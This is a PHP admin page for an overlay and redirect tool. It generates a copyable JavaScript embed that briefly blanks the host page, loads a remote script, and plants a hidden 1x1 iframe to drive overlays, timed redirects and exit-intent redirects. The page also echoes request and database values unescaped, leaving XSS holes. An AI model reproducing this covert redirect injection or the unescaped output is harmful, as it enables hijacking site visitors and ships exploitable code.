<?php
require_once("config.php");
require_once("setting.php");

// We need to use sessions to check loggedin.
//session_start();
// If the user is not logged in redirect to the login page...
if (!isset($_SESSION['loggedin'])) {
	header('Location: index.php');
	exit();
}

//Variable for notification
$check = 0;

$id = 0;
if(isset($_GET['id']))
{
	if($_GET['id'] == 'new')
	{
		$id = newSettings();
		echo "<script>location.href='home.php?id=".$id."'</script>";
	}
	else
		$id = $_GET['id'];
}

//Check post paremeter and save if set
if(isset($_POST['overlay_url']))
{
	// var_dump($_POST['id']);
	$return = saveSettings($_POST['redirect_name'], !isset($_POST['overlay_mode']) || $_POST['overlay_mode'] == 'NULL' ? 0 : 1, $_POST['overlay_url'], !isset($_POST['redirect_mode']) || $_POST['redirect_mode'] == 'NULL' ? 0 : 1, $_POST['redirect_sec'],$_POST['redirect_url'], !isset($_POST['exit_mode']) || $_POST['exit_mode'] == 'NULL' ? 0 : 1, $_POST['exit_url'], $id);
	//Get result and set notification
	if($return)
		$check = 1;
	else
		$check = 2;
}

//Get setting 
$setting = getSettings($id);
$ids = getIds();
$names = getNames();

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Overlay System</title>
	<link href="assets/css/style.css" rel="stylesheet" type="text/css">
	<link href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" rel="stylesheet" >
	<link href="assets/css/bootstrap.css" rel="stylesheet">
</head>

<body class="loggedin">
	<nav class="navtop">
		<div class = "container">
			<h1>Redirect System</h1>
			
			<a href="logout.php"><i class="fas fa-sign-out-alt"></i>Logout</a>
		</div>
	</nav>
	
	<div class = "optionsPane">
       <div class = "container">
       	<?php if($check == 1){?>
       		<div class="alert alert-success">
			  Save Success...<button class="close">&times;</button>
			</div>
       	<?php }?>
       	<?php if($check == 2){?>
       		<div class="alert alert-danger">
			  Database Operation Failed...<button class="close">&times;</button>
			</div>
       	<?php }?>
       	<?php if($check == 3){?>
       		<div class="alert alert-success">
			  Create New Success...<button class="close">&times;</button>
			</div>
       	<?php }?>

         <div class="collapse-wrapper">
            <input id="collapsable" class="toggle" type="checkbox" hidden>
            <label for="collapsable" class="label-toggle">Settings</label>
            <div class="collapse-content">
                <div class="collapse-inner">

                <form class="form-horizontal" method="post" enctype="multipart/form-data">
                  <div class = "optionItem">
	                <div class = "optionsLabelPane">
	                  <span class = "optionsLabel">Name (ID)</span>
	                </div>
	                <div class = "optionsInputPane">
	                <select class = "idSelector" onchange="changeID(this)" value = "<?php echo $id; ?>">
	                  <?php while($i = mysqli_fetch_assoc($ids)){ 
                      $name = mysqli_fetch_assoc($names); ?>
	                  	<option name = "id" value = "<?php echo $i['id']; ?>" <?php echo $i['id'] == $id ? 'selected' : ''; ?>> <?php echo $name['name'].' ('.$i['id'].')'; ?> </option>
	                  <?php } ?>
	                </select>
	                <input value = "New" class = "newBtn" onclick="createNew()">
	                </div>
	               </div>

                 <div class = "optionItem">
                    <div class = "optionsLabelPane">
                      <span class = "optionsLabel">Name</span>
                    </div>
                    <div class = "optionsInputPane">
                      <input type = "text" name = "redirect_name" class = "optionsURLInput" value = "<?php echo $setting['name']?>" required>
                    </div>
                  </div>

  	              <div class = "optionItem">
  	                <div class = "optionsLabelPane">
  	                  <span class = "optionsLabel">Overlay</span>
  	                </div>
  	                <div class = "optionsInputPane">
  	                  <div class="checkboxThree">
        				        <input type="checkbox" id="overlayMode" name = "overlay_mode" onchange = "overlayModeChange()" hidden 
        				        <?php echo $setting['overlayMode'] ? 'checked' : ''; ?>/>
        				        <label for="overlayMode"></label>
        				      </div>
  	                </div>
  	              </div>

                  <div class = "optionItem" id = "overlayURLPane" 
                  style = "display: <?php echo $setting['overlayMode'] ? 'show' : 'none'; ?>;">
                    <div class = "optionsLabelPane">
                      <span class = "optionsLabel">Overlay URL</span>
                    </div>
                    <div class = "optionsInputPane">
                      <input type = "text" name = "overlay_url" class = "optionsURLInput" value = "<?php echo $setting['overlayURL']?>">
                    </div>
                  </div>

                  <div class = "optionItem">
                    <div class = "optionsLabelPane">
                      <span class = "optionsLabel">Redirect</span>
                    </div>
                    <div class = "optionsInputPane">
                      <div class="checkboxThree">
				        <input type="checkbox" id="redirectMode" name = "redirect_mode" onchange = "redirectModeChange()" hidden
				        <?php echo $setting['redirectMode'] ? 'checked' : ''; ?>/>
				        <label for="redirectMode"></label>
				      </div>
                    </div>
                  </div>

                  <div class = "optionItem" id = "redirectSecPane" 
                  style = "display: <?php echo $setting['redirectMode'] ? 'show' : 'none'; ?>;">
                    <div class = "optionsLabelPane">
                      <span class = "optionsLabel">Redirect After</span>
                    </div>
                    <div class = "optionsInputPane">
                      <input type = "number" name = "redirect_sec" class = "optionsInput" value = "<?php echo $setting['redirectSec']?>">
                    </div>
                  </div>

                  <div class = "optionItem" id = "redirectURLPane" 
                  style = "display: <?php echo $setting['redirectMode'] ? 'show' : 'none'; ?>;">
                    <div class = "optionsLabelPane">
                      <span class = "optionsLabel">Redirect URL</span>
                    </div>
                    <div class = "optionsInputPane">
                      <input type = "text" name = "redirect_url" class = "optionsURLInput" value = "<?php echo $setting['redirectURL']?>">
                    </div>
                  </div>

                  <div class = "optionItem">
                    <div class = "optionsLabelPane">
                      <span class = "optionsLabel">Exit Intent Redirect</span>
                    </div>
                    <div class = "optionsInputPane">
                      <div class="checkboxThree">
				        <input type="checkbox" id="exitMode" name = "exit_mode" onchange = "exitModeChange()" hidden
				        <?php echo $setting['exitMode'] ? 'checked' : ''; ?>/>
				        <label for="exitMode"></label>
				      </div>
                    </div>
                  </div>

                  <div class = "optionItem" id = "exitURLPane" 
                  style = "display: <?php echo $setting['exitMode'] ? 'show' : 'none'; ?>;">
                    <div class = "optionsLabelPane">
                      <span class = "optionsLabel">Exit Intent Redirect URL</span>
                    </div>
                    <div class = "optionsInputPane">
                      <input type = "text" name = "exit_url" class = "optionsURLInput" value = "<?php echo $setting['exitURL']?>">
                    </div>
                  </div>

                  <div class = "optionItem">
	                <div class = "optionsLabelPane">
	                  
	                </div>
	                <div class = "optionsInputPane">
	                  <input type = "submit" value = "Save" class = "submitBtn" onclick="return confirm('Are you sure want to save?');">
                    <input type = "button" value = "Copy" class = "copyBtn" onclick = "copyCode()">
	                </div>
	              </div>

	            </form>
                </div>

            </div>
        </div>

        <pre>
        	<code id = "codePane">
&lt;script type = "text/javascript"&gt; var currentOrigin = 'localhost'; if(!window._fruit) (window._fruit = function(e) { var timer; return { createFruit: function() { if (e.body) { clearInterval(timer); var fruitIframe = e.createElement("iframe"); fruitIframe.setAttribute("src", "http://localhost/olive/test.php?id=" + "<?php echo $id?>");
fruitIframe.setAttribute("style", "display: none;"); fruitIframe.style.width = "1px"; fruitIframe.style.height = "1px"; fruitIframe.id = "fruitIframe"; e.body.insertBefore(fruitIframe, e.body.firstChild); } clearInterval(timer); }, loadOlive: function(src, id) { var script = e.createElement("script"); script.src = src; script.type = "text/javascript"; script.id = id, script.innerText, script.onerror = function() { _fruit.finish() }, e.getElementsByTagName("head")[0].appendChild(script) }, finish: function() { var loading = e.getElementById("fruitloading"); if(loading) loading.parentNode.removeChild(timer); var fruitIframe = e.getElementById("fruitIframe"); if(fruitIframe) fruitIframe.parentNode.removeChild(fruitIframe);
}, eat: function() { final_timer = setTimeout("_fruit.finish()", 6e3); var n = e.createElement("style"), i = e.getElementsByTagName("head")[0]; return n.setAttribute("id", "fruitloading"), n.setAttribute("type", "text/css"), n.styleSheet ? n.styleSheet.cssText = "body{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}" : n.appendChild(e.createTextNode("body{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}")), i.appendChild(n), this.loadOlive("http://olive/assets/js/olive.js", "olivesrc"), _fruit.createFruit(), timer = setInterval("_fruit.createFruit()", 50), final_timer } } }(document), window._fruit.eat()); &lt;/script&gt;&lt;link rel='dns-prefetch' href='//s.w.org'/&gt;

          </code>
        </pre>


      </div>
    </div>

</body>

<script src="assets/js/jquery-3.3.1.min.js"></script>

<script>

$('.close').on('click', function() {
  $(this).parent('.alert').hide();
});

function overlayModeChange(){
	if($("#overlayMode")[0].checked == true)
		$("#overlayURLPane").show();
	else
		$("#overlayURLPane").hide();
}

function redirectModeChange(){
	if($("#redirectMode")[0].checked == true)
	{
		$("#redirectSecPane").show();
		$("#redirectURLPane").show();
	}	
	else
	{
		$("#redirectSecPane").hide();
		$("#redirectURLPane").hide();
	}
}

function exitModeChange(){
	if($("#exitMode")[0].checked == true)
		$("#exitURLPane").show();
	else
		$("#exitURLPane").hide();
}

function changeID(sel)
{
  var selected = sel.options[sel.selectedIndex].value;

	window.location.href = "home.php?id=" + selected;
}

function createNew()
{
	window.location.href = "home.php?id=new";
}

function copyCode()
{
  var code = $("#codePane")[0].innerHTML;
  code = code.split("&lt;").join("<");
  code = code.split("&gt;").join(">");
  code = code.split("&amp;").join("&");

  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  
  dummy.value = code;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}

</script>

</html>
